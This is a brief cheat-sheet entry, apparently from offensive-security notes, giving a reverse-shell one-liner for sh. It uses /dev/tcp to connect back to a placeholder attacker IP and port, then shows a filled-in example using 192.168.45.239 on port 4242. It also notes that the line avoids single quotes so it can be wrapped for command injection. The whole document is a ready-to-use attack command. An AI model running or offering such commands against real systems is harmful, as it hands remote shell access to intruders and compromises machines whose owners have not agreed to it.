## Sh Reverse Shell

> Note: single quotes were avoided so that it can be wrapped in `'`${SHELL}`'`

Replace `${ATTACKER_IP}` and `${ATTACKER_LISTENER_PORT}` below:

```
0<&196;exec 196<>/dev/tcp/${ATTACKER_IP}/${ATTACKER_LISTENER_PORT}; sh <&196 >&196 2>&196
```

e.g.

```
0<&196;exec 196<>/dev/tcp/192.168.45.239/4242; sh <&196 >&196 2>&196
```
